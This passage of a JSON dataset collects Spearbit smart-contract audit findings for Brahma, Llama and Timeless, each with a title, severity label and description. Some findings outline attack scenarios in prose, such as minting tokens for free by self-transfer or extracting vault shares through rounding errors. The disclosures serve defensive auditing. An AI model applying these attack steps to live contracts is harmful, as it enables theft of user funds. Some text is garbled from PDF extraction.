        "body": "The AddressProvider implements the ownership with 2-step ownership transfers pattern, allowing the contract to keep track of an \"owner\" (labelled governance in AddressProvider) and only allowing transfers of said ownership via a 2-step process whereby the current owner can only \"propose\" a new owner which then has to manually accept ownership to confirm the transfer. The issue is the replication of this code. The repo already has openzeppelin-contracts as a dependency which has this exact pattern as an existing, heavily verified and audited implementation under con- tracts/access/Ownable2Step.sol. Besides the naming, they are mostly identical. The only functional difference is that the custom implementation disallows setting the pending owner to address(0) meaning that for cancelling pending transfers the owner of AddressProvider would need to use address(1). Furthermore the use of string 24 errors vs. custom errors is also a difference. However, if that is the main deciding factor a newer version of the OpenZeppelin library can be chosen that uses custom errors.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Type hash is not aligned with ValidationParams struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The ValidationParams struct implemented in the codebase is as follows: struct ValidationParams { uint32 expiryEpoch; bytes32 executionStructHash; bytes32 policyHash; } However, the type hash is derived from the following ValidationParams struct, which is different from the struct used within the codebase: struct ValidationParams { uint32 expiryEpoch; ExecutionParams executionParams bytes32 policyHash; } /* * ... * @dev keccak256(\"ValidationParams(uint32 expiryEpoch,ExecutionParams executionParams,bytes32 ,! policyHash)ExecutionParams(uint8 operation,address to,address account,address executor,uint256 value,uint256 nonce,bytes data)\") ,! */ bytes32 public constant VALIDATION_PARAMS_TYPEHASH = 0x68883b91861c8baad1e8d9f6fd31a22216bb9cd1aec71362de9879112a14cde4;",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Trusted validator weakens Safe access control via ExecutorPlugin",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The PolicyValidator contract validates signatures from the \"transaction validator\" (\"validator\" herein) on messages. This is used in the safe moderator contracts (SafeModerator, SafeModeratorOverrid- able) and ExecutorPlugin contracts to validate attempted transactions externally. For the safe moderators, this simply serves as an extra check to the minimum quorum of safe signers, for the ExecutorPlugin this authenticates arbitrary, direct module transactions. Executed from the ExecutorPlugin, if configured as a module can execute anything from asset transfers to other configuration transactions (e.g. removing modules, setting guards, adjusting members etc...). This means that by colluding with the validator, a single executor can take over complete control of the safe, removing event the parent console account's ability to override. This is because the ExecutorPlugin has no on-chain limits or checks on what signatures can be executed through it, the validator is fully trusted. This means that when the ExecutorPlugin is configured as a module and executors added to a sub-account the authorization required is weakened from [sub-account signer quorum (+ optional guard)] OR [parent console account approval (+ optional guard)] to [sub-account signer quorum (+ optional guard)] OR [parent console account approval ,! OR [[ANY 1 executor] AND [validator]] (+ optional guard)]",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use builtin functions to compute constant values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "ConsoleFallbackHandler.sol#L27, 0x1626ba7e is: UPDATED_MAGIC_VALUE = bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")) Note that the original Safe implementation also does not use builtin functions. A related issue is \"Initialization of hashes in Constants\".",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make sure the chain used to deploy the protocol implements the desired precompiles at the correct addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "When validating a signature the project uses Solday library to perform the check. The function used is SignatureCheckerLib.isValidSignatureNow that has the following assumption for the chain used for deployment: /// @dev Note: /// - The signature checking functions use the ecrecover precompile (0x1). /// - The /// variants use the identity precompile (0x4) to copy memory internally. bytes memory signature  ",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Best to use uint64 as a type for timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Currently the timestamps in the codebase use uint32 as a type. But the max value for this type will be reached within approximately 80 years.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi.encodeCall should be used instead of abi.encodePacked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "abi.encodeCall provides type checking: It is recommended to always use abi.encodeCall even if the method has no arguments as txns[0] = Types.Executable({ callType: Types.CallType.CALL, target: AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH), value: 0, data: abi.encodePacked(WalletRegistry.registerWallet.selector) // ...",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "AccountSecurityConfig checks could be expanded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The functions _checkSubAccountSecurityConfig() and _checkConsoleAccountSecurityCon- fig() do perform some checks but these checks could be expanded for more security. the singleton hasn't been",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading function names",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "1) enableExecutorPluginOnSubAccount: The SubAccount on the function name and the input pa- rameter are misleading as this function can also be called on the console account. function enableExecutorPluginOnSubAccount(address subAccount, address[] memory executors) 2) disableExecutorPluginOnSubAccount: The SubAccount on the function name and the input parameter are misleading as this function can also be called on the console account. function disableExecutorPluginOnSubAccount(address subAccount, address previousModule) 3) getExecutorsForSubAccount: The SubAccount on the function name and the input parameter are misleading as this function can also be called to query the list of executors for main console accounts. function getExecutorsForSubAccount(address _account) external view returns (address[] memory)",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function _decompileSignatures() could revert without descriptive error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function _decompileSignatures() checks (_signatures.length < 8). However if _signa- tures.length - 8 - sigLength results in a negative value, the transaction will revert without a descriptive error. This might make troubleshooting a failed transaction more difficult. function _decompileSignatures(bytes calldata _signatures) ... { if (_signatures.length < 8) revert InvalidSignatures(); uint32 sigLength = uint32(bytes4(_signatures[_signatures.length - 8:_signatures.length - 4])); expiryEpoch = uint32(bytes4(_signatures[_signatures.length - 4:_signatures.length])); validatorSignature = _signatures[_signatures.length - 8 - sigLength:_signatures.length - 8]; }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "1) The _onlyGov function is not used within the codebase: function _onlyGov() internal view { if (msg.sender != addressProvider.governance()) { revert NotGovernance(msg.sender); } } 2) The following _GUARDIAN_HASH constant is not used within the codebase: bytes32 internal constant _GUARDIAN_HASH = ,! 0x424560fc12b0242dae8bb63e27dad69d2589059728e8daf9b2ff8557998f3402;",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "isValidSignature() does fewer checks than SafeModerator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function isValidSignature() does isPolicySignatureValid(), which is the equivalent of the validatePre...Transaction...() call of the SafeModerators. However there is no equivalent of the checks done in the validatePost...Transaction...() call. The function isValidSignature() doesn't allow checks after the fact, but it could to the checks from validatePost...Transaction...(). function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns ,! (bytes4) { // ... if (_signature.length == 0) { require(safe.signedMessages(messageHash) != 0, \"Hash not approved\"); } else { // ... require(policyValidator.isPolicySignatureValid(msg.sender, messageHash, _signature), \"Policy ,! not approved\"); // ... } // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typographical errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Several typographical errors were identified within the code comments: // SafeModeratorOverridable.sol#L14 * @notice A guard that validates transactions and allows only policy abiding txns, on Brhma console ,! account and can be overriden by removal of guard // TransactionValidator.sol#L80 * @notice Provides on-chain guarantees on security critical expected states of a Brhma console account // SafeDeployer.sol#L172 * Enable Brhma Console account as module on sub Account",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "isValidSignature() doesn't check policy in combination with signedMessages()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function isValidSignature() doesn't check a policy if signedMessages() are used. The signedMessages() could be used in the following ways: 1) Delegate call to signMessage of SignMessageLib and checked via the Policy. 2) Delegate call to signMessage of SignMessageLib and via an extra installed module, outside of the knowledge of the protocol. 3) Left over from a pre-existing safe. Situation 1 is checked and should be allowed. Situation 2 and 3 are not checked by a Policy. function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns ,! (bytes4) { // ... if (_signature.length == 0) { require(safe.signedMessages(messageHash) != 0, \"Hash not approved\"); } else { // ... require(policyValidator.isPolicySignatureValid(msg.sender, messageHash, _signature), \"Policy ,! not approved\"); // ... } // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function _executeOnSafe() isn't used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function _executeOnSafe() isn't used in the current code. Note: it is used in some of the tests. function _executeOnSafe(address safe, address target, Enum.Operation op, bytes memory data) internal { bool success = IGnosisSafe(safe).execTransaction(...); if (!success) revert SafeExecTransactionFailed(); }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unreachable branch in ILlamaCore.actionsCount check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "the in InvalidLlamaCoreAddress(); will never revert with the error InvalidLlamaCoreAddress. ILlamaCore.actionsCount is defined as returning a uint256. LlamaTokenGovernor.initialize The check performed if (_llamaCore.actionsCount() < 0) revert function In cases where _llamaCore refers to an address without an actionsCount function, the call will revert before the < 0 check occurs. In cases where a value less than 0 is returned (i.e. an int256 is returned), the bytes will be interpreted as uint256 and fail to revert. See example in chisel: $ chisel Welcome to Chisel! Type int256 x = -75 x Type: int   !help to show available commands. Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb5 Decimal: -75 uint256(x) Type: uint Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb5 Decimal: 115792089237316195423570985008687907853269984665640564039457584007913129639861",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "delayPeriod only works if isFixedLengthApprovalPeriod=true or Governor is the only policyholder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "The active voting period in Llama is divided into three different periods in the Governor. The first period is the delayPeriod, in this period it is not possible to vote and it can be used to delegate voting power to others by calling the underlying ERC20 token. However, this concept assumes that the active voting period in LlamaCore has always a fixed length. This is defined by the isFixedLengthApprovalPeriod in the strategy. If it is false the action state can be changed to queuing as soon as the needed majority is reached. This can lead to edge cases, where the Governor can't approve or disapprove an action because it is stuck in the delayPeriod and the action has already been executed. If the Governor is the only policyholder for a specific role it does not matter, because a majority by others can not be reached earlier. 4",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaTokenGovernor only supports one role",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "The role of the LlamaTokenGovernor is defined in the initialize function. In Llama policyhold- ers such as the Governor contract can hold roles, which allows them to create action or participate in voting processes. A policyholder is capable of holding multiple distinct roles. However, if the Governor is assigned more than one role, it becomes impossible to participate in the voting processes associated with the additional roles. In addition, the stored role must be able to create actions and requires the right to approval or forceApproval. Otherwise, the castVote/castVeto function would revert to the strategy.checkIfApprovalEnabled call.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "uint16 cannot be less than 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "The vote and veto quorum percentage checks compare to 0 with ensuring they are not <= 0.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Save deploy cost and reduce maintenance overhead by using existing Checkpoint lib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "PeriodPctCheckpoints and QuorumCheckpoints are drafted to allow for checkpointing of data struc- tures not supported by the original OpenZeppelin Checkpoints lib. There is, however, support for Checkpoint208 as defined below: struct Checkpoint208 { uint48 _key; uint208 _value; }",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Document strategy compatibility and config requirements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "Not all strategies and configurations are compatible with the LlamaTokenGovernor.  Some strategies require that creator not be the approver.  Strategy must have a queuing period and approval period.  Interface must have approvalPeriod (not part of the core ILlamaStrategy interface).  Etc...",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add NatSpec comments for parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "Additional NatSpec comments for parameters would provide more clarity. For example: /// @notice Returns the period pct checkpoints array from a given set of indices. function getPeriodPctCheckpoints(uint256 start, uint256 end) The start parameter here is inclusive and the end parameter is exclusive. This information should be ideally provided in the comments.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo in comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "/** ,! - + * @dev Returns whether there is a checkpoint in the structure (i.e. it is not empty), and if so the timestamp and * peiod in the most recent checkpoint. * period in the most recent checkpoint. */",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Adding safety checks for ERC20 voting token in TokenAdapter initialize",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "Not all ERC20 tokens can be used as voting tokens for the Governor contract.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "submissionPeriodPct value is not used in the Governor contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf",
        "body": "The submissionPeriodPct can be set with the setPeriodPct together with delayPeriodPct and castingPeriodPct but is not used afterward. In the Governor contract, the active voting period from LlamaCore is divided into three parts. The delay period can be used to delegate voting power, castingPeriod for active voting and the submissionPeriod to submit the voting result.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mint PerpetualYieldTokens for free by self-transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The PYT.transfer and transferFrom functions operate on cached balance values. When transfer- ring tokens to oneself the decreased balance is overwritten by an increased balance which makes it possible to mint PYT tokens for free. Consider the following exploit scenario:  Attacker A self-transfers by calling token.transfer(A, token.balanceOf(A)).  balanceOf[msg.sender] is rst set to zero but then overwritten by balanceOf[to] = toBalance + amount, doubling As balance.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "xPYT auto-compound does not take pounder reward into account",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Conceptually, the xPYT.pound function performs the following steps: 1. Claims yieldAmount yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter). 2. Buys xPYT with the NYT. 3. Performs a ERC4626.redeem(xPYT) with the bought amount, burning xPYT and receiving pytAmountRedeemed PYT. 4. Performs a ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded). 5. Pays out a reward in PYT to the caller. The assetBalance is correctly updated for the rst four steps but does not decrease by the pounder reward which is transferred out in the last step. The impact is that the contract has a smaller assets (PYT) balance than what is tracked in assetBalance. 1. Future depositors will have to make up for it as sweep computes the difference between these two values. 2. The xPYT exchange ratio is wrongly updated and withdrawers can redeem xPYT for more assets than they should until the last withdrawer is left holding valueless xPYT. Consider the following example and assume 100% fees for simplicity i.e. pounderReward = pytCompounded.  Vault total: 1k assets, 1k shares total supply.  pound with 100% fee:  claims Y PYT/NYT.  swaps Y NYT to X xPYT.  redeems X xPYT for X PYT by burning X xPYT (supply -= X, exchange ratio is 1-to-1 in example).  assetBalance is increased by claimed Y PYT  pounder receives a pounder reward of X + Y PYT but does not decrease assetBalance by pounder reward X+Y.  Vault totals should be 1k-X assets, 1k-X shares, keeping the same share price.  Nevertheless, vault totals actually are 1k+Y assets, 1k-X shares. Although pounder receives 100% of pound- ing rewards the xPYT price (assets / shares) increased.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong yield accumulation in claimYieldAndEnter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The claimYieldAndEnter function does not accrue yield to the Gate contract itself (this) in case xPYT was specied. The idea is to accrue yield for the mint recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are minted to the Gate before its yield is accrued. Currently, the transfer from this to xPYT through the xPYT.deposit call accrues yield for this after the tokens have been minted to it (userPYTBalance * (updatedYieldPerToken - actualUserYieldPerToken) / PRECI- SION) and its balance increased. This leads to it receiving a larger yield amount than it should have.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Swapper left-over token balances can be stolen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Swapper contract may never have any left-over token balances after performing a swap because token balances can be stolen by anyone in several ways:  By using Swapper.doZeroExSwap with useSwapperBalance and tokenOut = tokenToSteal  Arbitrary token approvals to arbitrary spenders can be set on behalf of the Swapper contract using UniswapV3Swapper.swapUnderlyingToXpyt.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: High Risk"
        ]
    },
    {
        "title": "TickMath might revert in solidity version 0.8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "UniswapV3s TickMath library was changed to allow compilations for solidity version 0.8. However, adjustments to account for the implicit overow behavior that the contract relies upon were not performed. The In UniswapV3xPYT.sol is compiled with version 0.8 and indirectly uses this library through the OracleLibrary. the worst case, it could be that the library always reverts (instead of overowing as in previous versions), leading to a broken xPYT contract. The same pragma solidity >=0.5.0; instead of pragma solidity >=0.5.0 <0.8.0; adjustments have been made for the OracleLibrary and PoolAddress contracts. However, their code does not rely on implicit overow behavior.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Rounding issues when exiting a vault through shares",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "When exiting a vault through Gate.exitToVaultShares the user species a vaultSharesAmount. The amount of PYT&NYT to burn is determined by a burnAmount = _vaultSharesAmountToUnderlying- this function in derived YearnGate and ERC4626 Amount(vaultSharesAmount) call. All contracts round down the burnAmount. This means one needs to burn fewer amounts than the value of the received vault shares. implementations of This attack can be protable and lead to all vault shares being stolen If the gas costs of this attack are low. This can be the case with vault & underlying tokens with a low number of decimals, highly valuable shares, or cheap gas costs. Consider the following scenario: 7  Imagine the following vault assets: totalAssets = 1.9M, supply = 1M. Therefore, 1 share is theoretically worth 1.9 underlying.  Call enterWithUnderlying(underlyingAmount = 1900) to mint 1900 PYT/NYT (and the gate receives 1900 * supply / totalAssets = 1000 vault shares).  Call exitToVaultShares(vaultSharesAmount = 1), then burnAmount = shares.mulDivDown(totalAssets(), supply) = 1 * totalAssets / supply = 1. This burns 1 \"underlying\" (actually PYT/NYT but they are 1-to-1), but receive 1 vault share (worth 1.9 underlying). Repeat this for up to the minted 1900 PYT/NYT.  Can redeem the 1900 vault shares for 3610 underlying directly at the vault, making a prot of 3610 - 1900 = 1710 underlying.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Possible outstanding allowances from Gate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The vault parameter of Gate.enterWithUnderlying can be chosen by an attacker in such a way that underlying = vault.asset() is another vault token of the Gate itself. The subsequent _depositInto- Vault(underlying, underlyingAmount, vault) call will approve underlyingAmount of underlying tokens to the provided vault and could in theory allow stealing from other vault shares. This is currently only exploitable in very rare cases because the caller also has to transfer the underlyingAmount to the gate contract rst. For example, when transferring underlyingAmount = type(uint256).max is possible due to ashloans/ashmints and the vault shares implement approvals in a way that do not decrease anymore if the allowance is type(uint256).max, as is the case with ERC4626 vaults.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory.sol owner can change fees unexpectedly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Factory.sol owner may be able to front run yield calculations in a gate implementation and change user fees unexpectedly.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Low uniswapV3TwapSecondsAgo may result in AMM manipulation in pound()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The lower the value of uniswapV3TwapSecondsAgo is set with at construction creation time the easier It becomes easier for attackers to it becomes for an attacker to manipulate the results of the pound() function. manipulate automated market maker price feeds with a lower time horizon, requiring less capital to manipulate prices, although users may simply not use an xPYT contract that sets uniswapV3TwapSecondsAgo too low.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "UniswapV3Swapper uses wrong allowance check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Before the UniswapV3Swapper can exit a gate, it needs to set an XPYT allowance to the gate. The following check determines if an approval needs to be set: if ( args.xPYT.allowance(address(this), address(args.gate)) < tokenAmountOut ) { args.xPYT.safeApprove(address(args.gate), type(uint256).max); } args.gate.exitToUnderlying( args.recipient, args.vault, args.xPYT, tokenAmountOut ); The tokenAmountOut is in an underlying token amount but A legitimate gate.exitToUnderlying address(swapper)) checks allowance[swapper][gate] >= previewWithdraw(tokenAmountOut). is compared against an xPYT shares amount. xPYT.withdraw(tokenAmountOut, address(gate), call will call",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing check that tokenIn and tokenOut are different",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The doZeroExSwap() function takes in two ERC20 addresses which are tokenIn and tokenOut. The problem is that the doZeroExSwap() function does not check if the two token addresses are different from one another. Adding this check can reduce possible attack vectors.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gate.sol gives unlimitted ERC20 approval on pyt for arbitrary address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "A malicious contract may be passed into the claimYieldAndEnter() function as xPYT and given full control over any PYT the contract may ever hold. Even though PYT is validated to be a real PYT contract and the Gate.sol contract isnt expected to have any PYT in it, it would be safer to remove any unnecessary approvals.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Constructor function does not check for zero address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The constructor function does not check if the addresses passed in are zero addresses. This check can guard against errors during deployment of the contract.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Accruing yield to msg.sender is not required when minting to xPYT contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The _exit function always accrues yield to the msg.sender before burning new tokens. The idea is to accrue yield for the recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are burned on the Gate and not msg.sender.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unlocked solidity pragmas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Most of the implementation code uses a solidity pragma of 0.8.4. contracts that use different functions. Unlocked solidity pragmas can result in unexpected behaviors or errors with different compiler versions.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "No safeCast in UniswapV3Swappers _swap.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "It should be noted that solidity version 0.8.0 doesnt revert on overow when type-casting. For example, if you tried casting the value 129 from uint8 to int8, it would overow to -127 instead. This is because signed integers have a lower positive integer range compared to unsigned integers i.e -128 to 127 for int8 versus 0 to 255 for uint8.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "One step critical address change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Setting the owner in Ownable is a one-step transaction. This situation enables the scenario of contract functionality becoming inaccessible or making it so a malicious address that was accidentally set as owner could compromise the system.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing zero address checks in transfer and transferFrom functions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The codebase uses solmates ERC-20 implementation. It should be noted that this library sacrices user safety for gas optimization. As a result, their ERC-20 implementation doesnt include zero address checks on transfer and transferFrom functions.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Should add indexed keyword to deployed xPYT event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The DeployXPYT event only has the ERC20 asset_ marked as indexed while xPYT deployed can also have the indexed key word since you can use up to three per event and it will make it easier for bots to interact off chain with the protocol.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing check that tokenAmountIn is larger than zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "In doZeroExSwap() there is no check that the tokenAmountIn number is larger than zero. Adding this check can add more thorough validation within the function.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC20 does not emit Approval event in transferFrom",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The ERC20 contract does not emit new Approval events with the updated allowance in transferFrom. This makes it impossible to track approvals solely by looking at Approval events.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the ofcial UniswapV3 0.8 branch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The current repositories create local copies of UniswapV3s codebase and manually migrate the contracts to Solidity 0.8.  For FullMath.sol this also leads to some small gas optimizations in this LOC as it uses 0 instead of type(uint256).max + 1.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "No checks that provided xPYT matches PYT of the provided vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "The Gate contracts has many functions that allow specifying vault and a xPYT addresses as pa- rameter. The underlying of the xPYT address is assumed to be the same as the vaults PYT but this check is not enforced. Users that call the Gate functions with an xPYT contract for the wrong vault could see their de- posit/withdrawals lost.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
        "title": "Protocol does not work with non-standard ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens make modications to their ERC20s transfer or balanceOf functions. One kind include deationary tokens that charge certain fee for every transfer or transferFrom. Others are rebasing tokens that increase in balance over time. Using these tokens in the protocol can lead to issues such as:  Entering a vault through the Gate will not work as it tries to deposit the pre-fee amount instead of the received post-fee amount.  The UniswapV3Swapper tries to enter a vault with the pre-fee transfer amount.",
        "labels": [
            "Spearbit",
            "Timeless",
            "Severity: Informational"
        ]
    },
    {
